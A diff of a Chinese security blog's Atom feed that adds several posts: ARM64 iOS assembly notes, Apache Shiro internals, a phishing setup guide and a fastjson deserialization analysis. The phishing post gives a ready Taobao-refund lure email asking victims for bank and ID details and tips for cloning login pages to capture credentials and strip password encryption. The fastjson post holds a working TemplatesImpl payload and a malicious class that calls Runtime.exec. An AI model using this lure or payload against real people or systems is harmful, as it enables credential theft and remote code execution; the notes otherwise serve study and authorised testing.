@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">Klear·blog</title>
     <subtitle type="html">Klear的生活记录&amp;&amp;工作记录。</subtitle>
-    <updated>2022-11-17T09:59:44&#43;08:00</updated>
+    <updated>2022-12-13T17:47:42&#43;08:00</updated>
     <id>https://klearcc.github.io/</id>
     <link rel="alternate" type="text/html" href="https://klearcc.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://klearcc.github.io/atom.xml" />
@@ -16,6 +16,366 @@
             </author>
     <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
     <generator uri="https://gohugo.io/" version="0.103.1">Hugo</generator>
+        <entry>
+            <title type="text">ios慢慢学</title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/ios%E9%80%86%E5%90%91/" />
+            <id>https://klearcc.github.io/post/ios%E9%80%86%E5%90%91/</id>
+            <updated>2022-12-12T14:47:20&#43;08:00</updated>
+            <published>2022-12-07T21:14:27&#43;08:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">One 数据存取 cpu先将数据存储到低32位寄……</summary>
+            
+                <content type="html">&lt;h2 id=&#34;one&#34;&gt;One&lt;/h2&gt;
+&lt;h5 id=&#34;数据存取&#34;&gt;数据存取&lt;/h5&gt;
+&lt;p&gt;cpu先将数据存储到低32位寄存器	x0-x28 fp lr sp&lt;/p&gt;
+&lt;h5 id=&#34;pc寄存器&#34;&gt;pc寄存器&lt;/h5&gt;
+&lt;p&gt;指向 当前要执行的指令&lt;/p&gt;
+&lt;h5 id=&#34;sp寄存器&#34;&gt;SP寄存器&lt;/h5&gt;
+&lt;p&gt;Arm64位寄存器占8个字节&lt;/p&gt;
+&lt;p&gt;栈：程序从内存中开辟空间时 从高地址往低地址开辟。
+堆：从低地址向高地址开辟&lt;/p&gt;
+&lt;p&gt;在哪里 那里就是栈。32位POP PUSH已经取消了
+读/写数据都是往高地址读写	
+str 将数据从寄存器读出来，写到内存中
+Stp 可以操作两个寄存器
+ldr 相反&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;.text
+.global _A
+_A:
+    sub sp,sp,#20;  //sp寄存器的内存地址减32
+    stp x0,x1,[sp,#0x10]；   //将x0 x1寄存器的值 存到 sp地址+0x10的 内存区域。arm64 一个寄存器占8个字节
+    ldp x1,x0,[sp,#0x10];   //将位于sp地址+0x10 的内存区域的值，存到x1 x0寄存器内
+    add sp,sp,#20;  //复位
+    ret
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;fp寄存器&#34;&gt;FP寄存器&lt;/h5&gt;
+&lt;p&gt;很少用&lt;/p&gt;
+&lt;h5 id=&#34;bl和ret&#34;&gt;bl和ret&lt;/h5&gt;
+&lt;p&gt;bl
+将下一条指令的地址放到lr(x30)寄存器  即：返回地址
+转到福好处执行指令&lt;/p&gt;
+&lt;p&gt;ret
+跳转到lr(x30)地址 的地方&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/ios/" term="IOS" label="IOS" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/%E9%80%86%E5%90%91/" term="逆向" label="逆向" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        <entry>
+            <title type="text">cc链分析</title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/cc/" />
+            <id>https://klearcc.github.io/post/cc/</id>
+            <updated>2022-12-03T15:16:12&#43;08:00</updated>
+            <published>2022-12-03T15:14:27&#43;08:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">bilibili 白日梦组长 没学懂</summary>
+            
+                <content type="html">&lt;h2 id=&#34;bilibili&#34;&gt;bilibili&lt;/h2&gt;
+&lt;p&gt;白日梦组长&lt;/p&gt;
+&lt;p&gt;没学懂&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" term="java反序列化" label="java反序列化" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/%E6%BC%8F%E6%B4%9E/" term="漏洞" label="漏洞" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/java/" term="java" label="java" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        <entry>
+            <title type="text">shiro-550漏洞分析</title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/javasec_shiro/" />
+            <id>https://klearcc.github.io/post/javasec_shiro/</id>
+            <updated>2022-12-03T15:27:45&#43;08:00</updated>
+            <published>2022-11-23T21:14:27&#43;08:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">shiro关键组件 SecurityManager org.apache.shiro.mgt.SecurityManager shiro核心接口……</summary>
+            
+                <content type="html">&lt;h2 id=&#34;shiro关键组件&#34;&gt;shiro关键组件&lt;/h2&gt;
+&lt;h6 id=&#34;securitymanager&#34;&gt;SecurityManager&lt;/h6&gt;
+&lt;p&gt;org.apache.shiro.mgt.SecurityManager 	shiro核心接口，负责一个Subject全部安全操作&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;接口本身定义了login、logout、createSubject三个方法控制用户创建登录和退出&lt;/p&gt;
+&lt;p&gt;扩展了org.apache.shiro.authc.Authenticator。该接口提供了authenticate方法用来认证&lt;/p&gt;
+&lt;p&gt;扩展了org.apache.shiro.authz.Authorizer。该接口提供了对Permission和Role的校验方法&lt;/p&gt;
+&lt;p&gt;扩展了org.apache.shiro.session.mgt。该接口提供了start、getSession方法来创建获取会话&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;shiro为SecurityManager提供了了一个包含上述功能的实现类DefaultSecurityManager&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;subjectFactory：默认使用DefaultSubjectFactory，用来创建具体Subject实现类&lt;/p&gt;
+&lt;p&gt;subjectDAO：默认使用DefaultSubjectDAO，用来将最近subject中信息保存到Session中&lt;/p&gt;
+&lt;p&gt;rememberMeManager：提供记住我功能&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;DefaultSecurityManager有一个子类 DefaultWebSecurityManager，这个类在shiro-web包中。这个类默认创建配置了org.apache.shiro.web.mgt.CookieRememberManager，用来提供记住我相关功能。&lt;/p&gt;
+&lt;h6 id=&#34;subject&#34;&gt;Subject&lt;/h6&gt;
+&lt;p&gt;org.apache.shiro.subject.Subject是一个接口，表示Shiro中的一个用户&lt;/p&gt;
+&lt;p&gt;Subject接口同样提供了认证、授权和获取回话的能力，在应用程序中要获取一个当前的Subject，使用SecurityUtils.getSubject()即可。&lt;/p&gt;
+&lt;p&gt;只从功能上看似乎Subject和SecurityManager差不多，实际上Subject接口的实现类org.apache.shiro.subject.support.DelegatingSubject本质上就是一个SecurityManager的代理类。&lt;/p&gt;
+&lt;p&gt;DelegatingSubject中保存了一个transient修饰的SecurityManager成员变量。使用具体校验方法时实际上交给SecurityManager处理。DelegatingSubject中不保存和维持用户的状态，每次依赖底层的SecurityManager来校验，因此一般SecurityManager的实现类都提供一些缓存机制。&lt;/p&gt;
+&lt;h6 id=&#34;realm&#34;&gt;Realm&lt;/h6&gt;
+&lt;p&gt;org.apache.shiro.realm.Realm是shiro中的一个接口，shiro通过Realm来访问指定应用的安全实体（用户 角色 权限等）。一个Realm通常与一个数据源有一对一的关系，比如关系型数据库、文件系统等。&lt;/p&gt;
+&lt;p&gt;所以此接口的实现类将使用特定于数据源的API来进行认证或授权，比如JDBC、文件IO等。官方解释：特定于安全的DAO层。&lt;/p&gt;
+&lt;p&gt;使用中研发通常不会直接实现Realm接口，而是实现 shiro提供了一些相关功能的 抽象类，如AuthenticatingRealm/AuthorizingRealm；或者使用针对特定数据源提供的实现类，如JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm等&lt;/p&gt;
+&lt;h2 id=&#34;认证和授权校验流程&#34;&gt;认证和授权校验流程&lt;/h2&gt;
+&lt;p&gt;通过上面组件的了解，总结流程&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;应用程序获取当前的Subject（用户），调用相应校验方法&lt;/p&gt;
+&lt;p&gt;Subject将校验委托给SecurityManager进行判断&lt;/p&gt;
+&lt;p&gt;SecurityManager调用Realm获取信息判断用户对应用户的角色能否操作&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;shiro550&#34;&gt;Shiro550&lt;/h2&gt;
+&lt;p&gt;影响版本：1.x &amp;lt; 1.2.5&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/shiro/" term="shiro" label="shiro" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" term="java反序列化" label="java反序列化" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/%E6%BC%8F%E6%B4%9E/" term="漏洞" label="漏洞" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/java/" term="java" label="java" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        <entry>
+            <title type="text">钓鱼环境</title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E9%92%93%E9%B1%BC/" />
+            <id>https://klearcc.github.io/post/%E9%92%93%E9%B1%BC/</id>
+            <updated>2022-11-23T21:13:50&#43;08:00</updated>
+            <published>2022-11-03T19:25:27&#43;08:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">任务：钓鱼邮件 1、搭建邮件服务器以及相关……</summary>
+            
+                <content type="html">&lt;h3 id=&#34;任务钓鱼邮件&#34;&gt;任务：钓鱼邮件&lt;/h3&gt;
+&lt;p&gt;1、搭建邮件服务器以及相关钓鱼系统；
+2、邮件内容仿真
+3、邮箱不包括QQ 163等常见邮箱；
+4、获取信息包括且不限于：用户名、密码&lt;/p&gt;
+&lt;h3 id=&#34;gophish&#34;&gt;gophish&lt;/h3&gt;
+&lt;p&gt;项目：https://github.com/gophish/gophish&lt;/p&gt;
+&lt;h6 id=&#34;方式一&#34;&gt;方式一&lt;/h6&gt;
+&lt;p&gt;服务器(需要vps服务商开25端口)
+在release下载适合自己系统的包，解压运行gophish。直接当头一棒
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211012246823.png&#34; alt=&#34;image-20221101224009883&#34;&gt;
+解决()：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-cd&#34; data-lang=&#34;cd&#34;&gt;wget https://mirror.bjtu.edu.cn/gnu/libc/glibc-2.28.tar.xz --no-check-certificate
+tar -xf glibc-2.28.tar.xz
+cd glibc-2.28/
+mkdir build
+cd build/
+../configure --prefix=/usr/local/glibc-2.28
+yum install gcc
+../configure --prefix=/usr/local/glibc-2.28
+yum -y install centos-release-scl
+yum -y install devtoolset-8-gcc devtoolset-8-gcc-c++ devtoolset-8-binutils
+scl enable devtoolset-8 bash
+echo &amp;#34;source /opt/rh/devtoolset-8/enable&amp;#34; &amp;gt;&amp;gt;/etc/profile
+wget http://ftp.gnu.org/gnu/make/make-4.2.tar.gz
+tar -xzvf make-4.2.tar.gz
+cd make-4.2
+sudo ./configure
+sudo make
+sudo make install
+sudo rm -rf /usr/bin/make
+sudo cp ./make /usr/bin/
+make -v
+cd /usr/local/glibc-2.28/build/			##注意此目录
+yum install -y bison
+sudo ../configure --prefix=/usr --disable-profile --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin
+make  //make 运行时间较长
+make install
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;./gophish 	##安装
+安装完后会输出登录信息
+https://ip:3333 ##后台 默认密码见下图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211012359961.png&#34; alt=&#34;image-20221101235949907&#34;&gt;&lt;/p&gt;
+&lt;h6 id=&#34;方式2&#34;&gt;方式2&lt;/h6&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker pull gophish/gophish
+docker run -itd -p 80:80 -p 3333:3333 -p 8080:8080 -p 8443:8443  gophish/gophish /bin/bash
+docker exec -it 9e302e76f6c9 /bin/bash	##id换为自己容器id
+./gophish
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问https://ip:3333&lt;/p&gt;
+&lt;h3 id=&#34;ewomail&#34;&gt;ewomail&lt;/h3&gt;
+&lt;p&gt;关闭seLinux&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vi /etc/sysconfig/selinux
+SELINUX=enforcing 改为 SELINUX=disabled
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;检查swap&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;free -m 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果swap一行为0的话创建swap分区&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dd if=/dev/zero of=/mnt/swap bs=1M count=1024  ##大小可自己配置，如果服务器内存&amp;gt;2G则不用配置
+mkswap /mnt/swap	##设置交换分区文件
+swapon /mnt/swap	##启动swap
+##设置开启自启动swap分区
+##需要修改文件 /etc/fstab 中的 swap 行，添加
+/mnt/swap swap swap defaults 0 0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;##国外网络
+yum -y install git
+git clone https://github.com/gyxuehu/EwoMail.git
+cd EwoMail/install
+#需要输入一个邮箱域名，不需要前缀，列如下面的klear.cn，域名后面要加空格加en
+sh start.sh klear.cn en
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装好后设置hosts&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vi /etc/hosts
+添加以下内容，xxx.com为自己域名
+127.0.0.1 mail.xxx.com smtp.xxx.com imap.xxx.com
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装结束，访问面板&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://ip:7010/	##管理后台 密码：admin/ewomail123
+https://ip:7000/	##邮件系统(需要vps服务商开25端口)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;设置域名解析
+到域名管理后台按下图设置
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211020010727.png&#34; alt=&#34;image-20221102001004693&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取DKIM &amp;gt; 在邮件服务器执行 &lt;code&gt;amavisd -c /etc/amavisd/amavisd.conf showkeys&lt;/code&gt;
+将获取到的内容复制到http://www.ewomail.com/list-20.html即可查看记录值
+比如我在dynadot的域名设置
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211020013273.png&#34; alt=&#34;image-20221102001306242&#34;&gt;&lt;/p&gt;
+&lt;p&gt;设置完后可以使用域名访问后台了。&lt;/p&gt;
+&lt;h3 id=&#34;发件&#34;&gt;发件&lt;/h3&gt;
+&lt;p&gt;到此为止邮件服务器、gophish安装好了。
+gofish使用可自己百度
+其中有几个值得记录的&lt;/p&gt;
+&lt;h5 id=&#34;邮件主题&#34;&gt;邮件主题&lt;/h5&gt;
+&lt;p&gt;淘宝提醒您：退款失败&lt;/p&gt;
+&lt;h5 id=&#34;邮件模板-可以直接在html编辑&#34;&gt;邮件模板 可以直接在html编辑&lt;/h5&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+	&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+    亲爱的顾客您好!&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;您的下列订单退款失败 &amp;lt;br&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp; 订单编号： 104525977637836993&amp;lt;br&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp; 退款金额：￥499.00&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;因您的退款账户无效，请您至变更退款数据页面更正您的银行账号，为确认您的身份，需先输入您本人的身份证件数据，且退款账户所有人需与身份认证为同一人！ &amp;lt;br&amp;gt;点此查看&amp;lt;a href=&amp;#34;{{.URL}}&amp;#34;&amp;gt;退款详情&amp;lt;/a&amp;gt;,谢谢您的配合！ &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;------------------------------------&amp;lt;br&amp;gt;※请勿直接回复此信，若有疑问请至网络留言版留言，我们将尽速为您服务。
+{{.Tracker}}&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;效果&lt;/p&gt;
+&lt;p&gt;![image-20221102172148405](/Users/baicai/Library/Application Support/typora-user-images/image-20221102173908395.png)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211021740282.png&#34; alt=&#34;image-20221102174002216&#34;&gt;&lt;/p&gt;
+&lt;p&gt;gmial&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211021741671.png&#34; alt=&#34;image-20221102174127607&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211021741869.png&#34; alt=&#34;image-20221102174148824&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;钓鱼页面&#34;&gt;钓鱼页面&lt;/h4&gt;
+&lt;p&gt;import问题：摘自csdn..忘记哪位先辈了 抱歉，下次看到会贴出链接&lt;/p&gt;
+&lt;p&gt;（必看）经验之谈 · 注意事项
+在导入真实网站来作为钓鱼页面时，绝大多数情况下并非仅通过Import就能够达到理想下的克隆，通过多次实践，总结出以下几点注意事项&lt;/p&gt;
+&lt;p&gt;【捕获不到提交的数据】导入后要在HTML编辑框的非Source模式下观察源码解析情况，如果明显发现存在许多地方未加载，则有可能导入的源码并非页面完全加载后的前端代码，而是一个半成品，需要通过浏览器二次解析，渲染未加载的DOM。这种情况下，除非能够直接爬取页面完全加载后的前端代码，否则无法利用gophish进行钓鱼，造成的原因是不满足第2点。&lt;/p&gt;
+&lt;p&gt;【捕获不到提交的数据】导入的前端源码，必须存在严格存在&amp;lt;form method=&amp;quot;post&amp;quot; ···&amp;gt;&amp;lt;input name=&amp;quot;aaa&amp;quot; ··· /&amp;gt; ··· &amp;lt;input type=&amp;quot;submit&amp;quot; ··· /&amp;gt;&lt;/form&gt;结构，即表单（POST方式）— Input标签（具有name属性）Input标签（submit类型）— 表单闭合的结构，如果不满足则无法捕获到提交的数据&lt;/p&gt;
+&lt;p&gt;【捕获不到提交的数据】在满足第2点的结构的情况下，还需要求&amp;lt;form method=&amp;quot;post&amp;quot; ···&amp;gt;在浏览器解析渲染后（即预览情况下）不能包含action属性，或者action属性的值为空。否则将会把表单数据提交给action指定的页面，而导致无法被捕获到&lt;/p&gt;
+&lt;p&gt;【捕获数据不齐全】对于需要被捕获的表单数据，除了input标签需要被包含在&lt;form&gt;中，还需满足该&lt;input&gt;存在name属性。例如&lt;input name=&#34;username&#34;&gt;,否则会因为没有字段名而导致value被忽略&lt;/p&gt;
+&lt;p&gt;【密码被加密】针对https页面的import，通常密码会进行加密处理，这时需要通过审计导入的前端代码，找到加密的JavaScript函数（多数情况存在于单独的js文件中，通过src引入），将其在gophish的HTML编辑框中删除，阻止表单数据被加密
+以上5点是在实践中总结出来的宝贵经验，或许还有其他许多坑未填，但所有的坑通常都围绕在&lt;form&gt;&lt;input /&gt;&lt;/form&gt;结构中，所以如果遇到新坑，先将该结构排查一遍，还是不行，再另辟蹊径&lt;/p&gt;
+&lt;h3 id=&#34;例&#34;&gt;例&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://klearcc.github.io/post/%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/&#34;&gt;苏宁易购&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211051242637.png&#34; alt=&#34;image-20221105124224570&#34;&gt;&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/%E9%92%93%E9%B1%BC/" term="钓鱼" label="钓鱼" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
         <entry>
             <title type="text">gophish抓用户输入例子</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/" />
@@ -99,7 +459,7 @@
             <title type="text">全版本fastjson反序列化漏洞分析</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/" />
             <id>https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/</id>
-            <updated>2022-11-17T09:59:43&#43;08:00</updated>
+            <updated>2022-12-13T17:47:39&#43;08:00</updated>
             <published>2022-10-20T17:08:27&#43;08:00</published>
             <author>
                     <name>Klear</name>
@@ -171,7 +531,8 @@
 类的类型：java.lang.reflect.Type。可以使用@type指定反序列化任意类或者说此属性指定json数据应该被反序列化为什么类型的对象
 fastjson功能要点：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;1. 使用JSON.parse(jsonString)和JSON.parseObject(jsonString,Target.class)，两者调用链一致，parse会在jsonString中解析字符串获取@type指定的类，parseObject会直接使用参数中的class
-1. 使用JSON.parseObject(jsonString)将会返回JSONObeject对象，并且类中的set&amp;amp;&amp;amp;get方法都会被调用(指定@type的情况下)
+2. 使用JSON.parseObject(jsonString)将会返回JSONObeject对象，并且类中的set&amp;amp;&amp;amp;get方法都会被调用(指定@type的情况下)
+3.fastjson在为类属性寻找get/set方法时，调用com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()方法，会忽略_|-字符串，也就是说就算字段名为_ag_e，getter方法为getAge(),fastjson也可以找到，
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;fastjson1224反序列化漏洞&#34;&gt;Fastjson&amp;lt;=1.2.24反序列化漏洞&lt;/h2&gt;
 &lt;h5 id=&#34;漏洞介绍&#34;&gt;漏洞介绍&lt;/h5&gt;
@@ -249,10 +610,73 @@ terminal输出setName is running，说明整个过程中setName方法也被调�
 &lt;li&gt;基于rmi的利用方式：适用jdk版本：&lt;code&gt;JDK 6u132&lt;/code&gt;, &lt;code&gt;JDK 7u122&lt;/code&gt;, &lt;code&gt;JDK 8u113&lt;/code&gt;之前。&lt;/li&gt;
 &lt;li&gt;基于ldap的利用方式：适用jdk版本：&lt;code&gt;JDK 11.0.1&lt;/code&gt;、&lt;code&gt;8u191&lt;/code&gt;、&lt;code&gt;7u201&lt;/code&gt;、&lt;code&gt;6u211&lt;/code&gt;之前&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;TemplatesImpl&lt;/p&gt;
-&lt;p&gt;jdbcRowSetImpl&lt;/p&gt;
-&lt;p&gt;有空闲时间&lt;/p&gt;
-&lt;h2 id=&#34;1225fastjson1241&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.41&lt;/h2&gt;
+&lt;h6 id=&#34;templatesimpl&#34;&gt;TemplatesImpl&lt;/h6&gt;
+&lt;p&gt;TemplatesImpl类位于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，实现了Serialize接口，因此可以被反序列化。&lt;/p&gt;
+&lt;p&gt;类中的getOutputProperties()方法是类成员变量 _outPutProperties的getter方法，它调用了newTransformer()方法
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/202212131745102.png&#34; alt=&#34;image-20221213155356078&#34;&gt;
+newTransformer()方法又调用了getTransletInstance()方法
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212131746158.png&#34; alt=&#34;image-20221213155520765&#34;&gt;
+这个方法中存在一个 _class，是一个Class类型的数组，数组下标为 _transletIndex的类会在getTransletInstance()方法中使用newInstance()实例化
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/202212131746152.png&#34; alt=&#34;image-20221213155901998&#34;&gt;
+这样调用链就有点眉目了，所以现在看 _class是否可控。findusages有三处调用
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212131747553.png&#34; alt=&#34;image-20221213160450615&#34;&gt;
+看下defineTransletClasses()的逻辑
+_bytecodes非空，然后调用自定义classload加载 _bytecode中的byte[],并且如果这个类的父类为ABSTRACT_TRANSLET，就会将类成员属性的 _transletIndex设置为当前循环中的标记位，如果是第一次调用，就是 _class[0]，如果父类不是这个类则抛出异常。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212131747192.png&#34; alt=&#34;image-20221213161332002&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这样一条完整的链揪出来了&lt;/p&gt;
+&lt;p&gt;构造一个TemplatesImpl类的反序列化字符串，其中 _bytecodes是我们构造的恶意类的字节码，而且他的父类是AbstractTranslat，最终这个类会被加载并使用newInstance()实例化
+返序列化过程中，由于getter方法getOutputProperties()满足条件，会被fastjson调用，这个方法触发了整个利用链getOutputProperties()-&amp;gt;newTransformer()-&amp;gt;getTransletInstance()-&amp;gt;defineTransletClasses()-&amp;gt;EvilClass.newInstance&lt;/p&gt;
+&lt;p&gt;为了满足漏洞点触发之间不退出，还需满足 _name非空，_factory非空。有些私有变量没有setter方法，需要使用Feature.SupportNonPublicField&lt;/p&gt;
+&lt;p&gt;最终payload&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;String json8 = &amp;#34;{\n&amp;#34; +
+        &amp;#34;    \&amp;#34;@type\&amp;#34;: \&amp;#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&amp;#34;,\n&amp;#34; +
+        &amp;#34;    \&amp;#34;_bytecodes\&amp;#34;: [\&amp;#34;&amp;#34;+code+&amp;#34;\&amp;#34;],\n&amp;#34; +
+        &amp;#34;    \&amp;#34;_name\&amp;#34;: \&amp;#34;klear\&amp;#34;,\n&amp;#34; +
+        &amp;#34;    \&amp;#34;_tfactory\&amp;#34;: {},\n&amp;#34; +
+        &amp;#34;    \&amp;#34;_outputProperties\&amp;#34;: { },\n&amp;#34; +
+        &amp;#34;}&amp;#34;;
+###拿到恶意类字节码
+        String code = Base64.getEncoder().encodeToString(Repository.lookupClass(xxxx.class).getBytes());
+        System.out.println(code);
+###恶意类
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+/**
+ * @author: 秦始皇
+ * @date: 12/13/22 14:39
+ * @description:
+ */
+public class vulclassTempl extends AbstractTranslet {
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+    public vulclassTempl() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+        Class cls = Class.forName(&amp;#34;java.lang.Runtime&amp;#34;);
+        Method method = cls.getMethod(&amp;#34;getRuntime&amp;#34;,null);
+        Object obs = method.invoke(null,null);
+        Method method1 = obs.getClass().getMethod(&amp;#34;exec&amp;#34;,String.class);
+        method1.invoke(obs,&amp;#34;open -a Calculator.app&amp;#34;);
+    }
+
+    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
+        vulclassTempl vulclassTempl = new vulclassTempl();
+
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;1225fastjson1241&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.41&lt;/h2&gt;
